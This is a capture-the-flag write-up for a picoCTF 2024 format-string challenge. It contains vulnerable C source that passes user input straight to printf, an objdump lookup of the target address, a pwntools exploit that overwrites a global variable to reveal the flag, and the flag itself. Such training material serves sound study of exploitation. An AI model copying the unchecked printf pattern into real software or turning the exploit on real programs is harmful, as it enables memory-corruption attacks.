## CTF: picoCTF 2024

Challenge: Format String 2

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must *change* data in its memory!

## Solution

After running initial checks, look at the behavior:

```
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
a
Here's your input: a
sus = 0x21737573
You can do better!
```

We need to change "sus". Looking at the source code:

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];

  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);
    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }
  return 0;
}
```

Format string vulnerability in buf. Need to change sus to 0x67616c66. After fuzzing, our input starts at position 14 (for fmtstr_payload). Find sus address with objdump:

```bash
$ objdump -t vuln | grep sus
0000000000404048 g     O .data  0000000000000004              sus
```

### Exploit

```python
from pwn import *
elf = context.binary = ELF("./vuln")
p = process("./vuln")
#p = remote('chatelaine.cylabacademy.net', 38239)
sus = 0x404048
flag = 0x67616c66
payload = fmtstr_payload(14, {sus : flag})
p.sendline(payload)
p.interactive()
```

## Flag

```
academy{f0rm47_57r?_f0rm47_m3m_1c092a1e}
```

## Mitigation

Don't trust the user, always limit the size properly and use format strings correctly.
